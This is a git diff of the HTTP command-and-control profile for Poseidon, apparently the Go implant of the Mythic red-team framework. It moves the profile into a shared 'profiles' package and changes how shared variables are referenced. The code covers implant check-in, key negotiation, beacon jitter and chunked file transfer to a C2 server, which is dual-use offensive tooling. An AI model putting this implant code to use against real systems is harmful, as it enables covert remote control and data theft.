@@ -1,6 +1,7 @@
-// This file is copied to pkg/profiles/ directory when Poseidon is built using the http profile at https://github.com/MythicC2Profiles/http
+// +build linux darwin
+// +build http
 
-package http
+package profiles
 
 import (
 	"bytes"
@@ -18,18 +19,13 @@ import (
 	"reflect"
 	"strconv"
 	"strings"
-	"sync"
 	"time"
 
 	// Poseidon
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles"
 )
-
-// UUID is a per-payload identifier assigned by Mythic during creation
-var UUID string
 
 // HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
 // All variables must be a string so they can be set with ldflags
@@ -71,8 +67,6 @@ var proxy_port string
 var proxy_user string
 var proxy_pass string
 
-var mu sync.Mutex
-
 type C2Default struct {
 	BaseURL        string
 	PostURI        string
@@ -92,7 +86,7 @@ type C2Default struct {
 }
 
 // New creates a new HTTP C2 profile from the package's global variables and returns it
-func New() profiles.Profile {
+func New() Profile {
 	profile := C2Default{
 		BaseURL:       fmt.Sprintf("%s:%s/", callback_host, callback_port),
 		PostURI:       post_uri,
@@ -142,7 +136,7 @@ func New() profiles.Profile {
 }
 
 func (c C2Default) getSleepTime() int {
-	return c.Interval + int(math.Round((float64(c.Interval) * (profiles.SeededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
+	return c.Interval + int(math.Round((float64(c.Interval) * (SeededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
 }
 
 func (c C2Default) SleepInterval() int {
@@ -216,7 +210,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operat
 
 //NegotiateKey - EKE key negotiation
 func (c *C2Default) NegotiateKey() string {
-	sessionID := profiles.GenerateSessionID()
+	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	// Replace struct with dynamic json
@@ -528,7 +522,7 @@ func (c *C2Default) SendFile(task structs.Task, params string, ch chan []byte) {
 		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
 		errResponseEnc, _ := json.Marshal(errResponse)
 		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
+		TaskResponses = append(TaskResponses, errResponseEnc)
 		mu.Unlock()
 		return
 	}
@@ -541,7 +535,7 @@ func (c *C2Default) SendFile(task structs.Task, params string, ch chan []byte) {
 		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
 		errResponseEnc, _ := json.Marshal(errResponse)
 		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
+		TaskResponses = append(TaskResponses, errResponseEnc)
 		mu.Unlock()
 		return
 	}
@@ -556,7 +550,7 @@ func (c *C2Default) SendFile(task structs.Task, params string, ch chan []byte) {
 		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
 		errResponseEnc, _ := json.Marshal(errResponse)
 		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
+		TaskResponses = append(TaskResponses, errResponseEnc)
 		mu.Unlock()
 		return
 	}
@@ -581,7 +575,7 @@ func (c *C2Default) GetFile(r structs.FileRequest, ch chan []byte) ([]byte, erro
 
 	msg, _ := json.Marshal(fileUploadMsg)
 	mu.Lock()
-	profiles.UploadResponses = append(profiles.UploadResponses, msg)
+	UploadResponses = append(UploadResponses, msg)
 	mu.Unlock()
 	// Wait for response from apfell
 	rawData := <-ch
@@ -607,7 +601,7 @@ func (c *C2Default) GetFile(r structs.FileRequest, ch chan []byte) ([]byte, erro
 
 			msg, _ := json.Marshal(fileUploadMsg)
 			mu.Lock()
-			profiles.UploadResponses = append(profiles.UploadResponses, msg)
+			UploadResponses = append(UploadResponses, msg)
 			mu.Unlock()
 			rawData := <-ch
 			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
@@ -654,7 +648,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan [
 
 	msg, _ := json.Marshal(chunkResponse)
 	mu.Lock()
-	profiles.TaskResponses = append(profiles.TaskResponses, msg)
+	TaskResponses = append(TaskResponses, msg)
 	mu.Unlock()
 
 	var fileDetails map[string]interface{}
@@ -671,7 +665,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan [
 			errResponseEnc, _ := json.Marshal(errResponse)
 
 			mu.Lock()
-			profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
+			TaskResponses = append(TaskResponses, errResponseEnc)
 			mu.Unlock()
 			return
 		}
@@ -707,7 +701,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan [
 
 		encmsg, _ := json.Marshal(msg)
 		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, encmsg)
+		TaskResponses = append(TaskResponses, encmsg)
 		mu.Unlock()
 
 		// Wait for a response for our file chunk
@@ -723,7 +717,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan [
 				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
 				errResponseEnc, _ := json.Marshal(errResponse)
 				mu.Lock()
-				profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
+				TaskResponses = append(TaskResponses, errResponseEnc)
 				mu.Unlock()
 				return
 			}
@@ -744,7 +738,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan [
 			// If the post was not successful, wait and try to send it one more time
 
 			mu.Lock()
-			profiles.TaskResponses = append(profiles.TaskResponses, encmsg)
+			TaskResponses = append(TaskResponses, encmsg)
 			mu.Unlock()
 		}
 
@@ -761,7 +755,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan [
 	final.UserOutput = "file downloaded"
 	finalEnc, _ := json.Marshal(final)
 	mu.Lock()
-	profiles.TaskResponses = append(profiles.TaskResponses, finalEnc)
+	TaskResponses = append(TaskResponses, finalEnc)
 	mu.Unlock()
 	return
 }
